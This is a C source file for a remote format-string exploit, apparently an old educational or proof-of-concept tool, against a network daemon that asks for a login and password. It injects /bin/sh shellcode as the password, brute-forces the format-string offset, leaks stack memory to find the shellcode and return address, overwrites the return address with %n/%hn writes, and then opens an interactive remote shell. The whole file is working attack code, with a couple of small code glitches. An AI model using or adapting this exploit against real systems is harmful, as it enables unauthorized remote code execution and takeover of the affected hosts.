 #include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <unistd.h>
#include <getopt.h>



char verbose = 0, debug = 0;

#define OCT( b0, b1, b2, b3, addr, str ) { \
b0 = (addr >> 24) & 0xff; \
b1 = (addr >> 16) & 0xff; \
b2 = (addr >> 8) & 0xff; \
b3 = (addr ) & 0xff; \
if ( b0 * b1 * b2 * b3 == 0 ) { \
printf( "\n%s contains a NUL byte. Leaving...\n", str ); \
exit( EXIT_FAILURE ); \
} \
}
#define MAX_FMT_LENGTH 128
#define ADD 0x100
#define FOURsizeof( size_t ) * 4
#define TWO sizeof( size_t ) * 2
#define BANNER "uname -a ; id"
#define MAX_OFFSET 255

int interact(int sock)
{
fd_set fds;
ssize_t ssize;
char buffer[1024];

write(sock, BANNER"\n", sizeof(BANNER));
while (1) {
FD_ZERO(&fds);
FD_SET(STDIN_FILENO, &fds);
FD_SET(sock, &fds);
select(sock + 1, &fds, NULL, NULL, NULL);

if (FD_ISSET(STDIN_FILENO, &fds)) {
ssize = read(STDIN_FILENO, buffer, sizeof(buffer));
if (ssize < 0) {
return(-1);
}
if (ssize == 0) {
return(0);
}
write(sock, buffer, ssize);
}

if (FD_ISSET(sock, &fds)) {
ssize = read(sock, buffer, sizeof(buffer));
if (ssize < 0) {
return(-1);
}
if (ssize == 0) {
return(0);
}
write(STDOUT_FILENO, buffer, ssize);
}
}
return(-1);
}

u_long resolve(char *host)
{
struct hostent *he;
u_long ret;

if(!(he = gethostbyname(host)))
{
herror("gethostbyname()");
exit(-1);
}

memcpy(&ret, he->h_addr, sizeof(he->h_addr));
return ret;
}
int
build_hn(char * buf, unsigned int locaddr, unsigned int retaddr, unsigned int offset, unsigned int base)
{
unsigned char b0, b1, b2, b3;
unsigned int high, low;
int start = ((base / (ADD * ADD)) + 1) * ADD * ADD;
int sz;

/* <locaddr>: where to overwrite */
OCT(b0, b1, b2, b3, locaddr, "[ locaddr ]");
sz = snprintf(buf, TWO + 1, /* 8 char to have the 2 addresses */
"%c%c%c%c"/* + 1 for the ending \0 */
"%c%c%c%c",
b3, b2, b1, b0,
b3 + 2, b2, b1, b0);

/* where is our shellcode? */
OCT(b0, b1, b2, b3, retaddr, "[ retaddr ]");
high = (retaddr & 0xffff0000) >> 16;
low = retaddr & 0x0000ffff;

return snprintf(buf + sz, MAX_FMT_LENGTH,
"%%.%hdx%%%d$n%%.%hdx%%%d$hn",
low - TWO + start - base,
offset,
high - low + start,
offset + 1);
}



void get_addr_as_char(u_int addr, char *buf) {

*(u_int*)buf = addr;
if (!buf[0]) buf[0]++;
if (!buf[1]) buf[1]++;
if (!buf[2]) buf[2]++;
if (!buf[3]) buf[3]++;
}

int get_offset(int sock) {

int i, offset = -1, len;
char fmt[128], buf[128];

for (i = 1; i<MAX_OFFSET && offset == -1; i++) {

snprintf(fmt, sizeof(fmt), "AAAA%%%d$x", i);
write(sock, fmt, strlen(fmt));
memset(buf, 0, sizeof(buf));
sleep(1);
if ((len = read(sock, buf, sizeof(buf))) < 0) {
fprintf(stderr, "Error while looking for the offset (%d)\n", len);
close(sock);
exit(EXIT_FAILURE);
}

if (debug)
fprintf(stderr, "testing offset = %d fmt = [%s] buf = [%s] len = %d\n",
i, fmt, buf, len);

if (!strcmp(buf, "AAAA41414141"))
offset = i;
}
return offset;
}

char *shellcode =
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh";

int main(int argc, char **argv)
{
char *ip = "127.0.0.1", *ptr;
struct sockaddr_in sck;
u_int read_at, addr_stack = (u_int)0xbfffe0001; /* default bottom */
u_int addr_shellcode = -1, addr_buffer = -1, addr_ret = -1;
char buf[1024], fmt[128], c;
int port = 12345, offset = -1;
int sd, len, i;
if (argc == 1) {
      printf("Using the exploit:\n");
      printf("./expl-fmtd [options] -i host -p port -a 0xadress\n");
      printf("v - Verbose\nd - debug\n");
      exit(0);
    };

while ((c = getopt(argc, argv, "dvi:p:a:o:")) != -1) {
switch (c) {
case 'i':
ip = optarg;
break;

case 'p':
port = atoi(optarg);
break;

case 'a':
addr_stack = strtoul(optarg, NULL, 16);
break;

case 'o':
offset = atoi(optarg);
break;

case 'v':
verbose = 1;
break;

case 'd':
debug = 1;
break;

default:
fprintf(stderr, "Unknwon option %c (%d)\n", c, c);
exit (EXIT_FAILURE);
}
}

/* init the sockaddr_in */
fprintf(stderr, "Using IP %s\n", ip);
sck.sin_family = PF_INET;
sck.sin_addr.s_addr = resolve(ip);
sck.sin_port = htons (port);

/* open the socket */
if (!(sd = socket (PF_INET, SOCK_STREAM, 0))) {
perror ("socket()");
exit (EXIT_FAILURE);
}

/* connect to the remote server */
if (connect (sd, (struct sockaddr *) &sck, sizeof (sck)) < 0) {
perror ("Connect() ");
exit (EXIT_FAILURE);
}
fprintf (stderr, "Connected to %s\n", ip);
if (debug) sleep(10);

/* send login */
memset (buf, 0x0, sizeof(buf));
len = read(sd, buf, sizeof(buf));
if (strncmp(buf, "login", 5)) {
fprintf(stderr, "Error: no login asked [%s] (%d)\n", buf, len);
close(sd);
exit(EXIT_FAILURE);
}
strcpy(buf, "toto");
len = write (sd, buf, strlen(buf));
if (verbose) fprintf(stderr, "login sent [%s] (%d)\n", buf, len);
sleep(1);

/* passwd: shellcode in the buffer and in the remote stack */
len = read(sd, buf, sizeof(buf));
if (strncmp(buf, "password", 8)) {
fprintf(stderr, "Error: no password asked [%s] (%d)\n", buf, len);
close(sd);
exit(EXIT_FAILURE);
}
write (sd, shellcode, strlen(shellcode));
if (verbose) fprintf (stderr, "passwd (shellcode) sent (%d)\n", len);
sleep(1);

/* find offset */
if (offset == -1) {
if ((offset = get_offset(sd)) == -1) {
fprintf(stderr, "Error: can't find offset\n");
fprintf(stderr, "Please, use the -o arg to specify it.\n");
close(sd);
exit(EXIT_FAILURE);
}
if (verbose) fprintf(stderr, "[Found offset = %d]\n", offset);
}

/* look for the address of the shellcode in the remote stack */
memset (fmt, 0x0, sizeof(fmt));
read_at = addr_stack;
get_addr_as_char(read_at, fmt);
snprintf(fmt+4, sizeof(fmt)-4, "%%%d$s", offset);
write(sd, fmt, strlen(fmt));
sleep(1);

while((len = read(sd, buf, sizeof(buf))) > 0 &&
(addr_shellcode == -1 || addr_buffer == -1 || addr_ret == -1) ) {

if (debug) fprintf(stderr, "Read at 0x%x (%d)\n", read_at, len);

/* the shellcode */
if ((ptr = strstr(buf, shellcode))) {
addr_shellcode = read_at + (ptr-buf) - 4;
fprintf (stderr, "[shell addr is: 0x%x (%d) ]\n", addr_shellcode, len);
fprintf(stderr, "buf = (%d)\n", len);
for (i=0; i<len; i++) {
fprintf(stderr,"%.2x ", (int)(buf[i] & 0xff));
if (i && i%20 == 0) fprintf(stderr, "\n");
}
fprintf(stderr, "\n");
}

/* the input buffer */
if (addr_buffer == -1 && (ptr = strstr(buf, fmt))) {
addr_buffer = read_at + (ptr-buf) - 4;
fprintf (stderr, "[buffer addr is: 0x%x (%d) ]\n", addr_buffer, len);
fprintf(stderr, "buf = (%d)\n", len);
for (i=0; i<len; i++) {
fprintf(stderr,"%.2x ", (int)(buf[i] & 0xff));
if (i && i%20 == 0) fprintf(stderr, "\n");
}
fprintf(stderr, "\n\n");
}

/* return address */
if (addr_buffer != -1) {
i = 4;
while (i<len-5 && addr_ret == -1) {
if (buf[i] == (char)0xff && buf[i+1] == (char)0xbf &&
buf[i+4] == (char)0x04 && buf[i+5] == (char)0x08) {
addr_ret = read_at + i - 2 + 4 - 4;
fprintf (stderr, "[ret addr is: 0x%x (%d) ]\n", addr_ret, len);
}
i++;
}
}

read_at += (len-4+1);
if (len == sizeof(buf)) {
fprintf(stderr, "Warning: this has not been tested !!!\n");
fprintf(stderr, "len = %d\nread_at = 0x%x", len, read_at);
read_at-=strlen(shellcode);
}
get_addr_as_char(read_at, fmt);
write(sd, fmt, strlen(fmt));
}

/* send the format string */
fprintf (stderr, "Building format string ...\n");
memset(buf, 0, sizeof(buf));
build_hn(buf, addr_ret, addr_shellcode, offset, 0);
write(sd, buf, strlen(buf));
sleep(1);
read(sd, buf, sizeof(buf));

/* call the return while quiting */
fprintf (stderr, "Sending the quit ...\n");
strcpy(buf, "quit");
write(sd, buf, strlen(buf));
sleep(1);

interact(sd);

close(sd);
return 0;
}
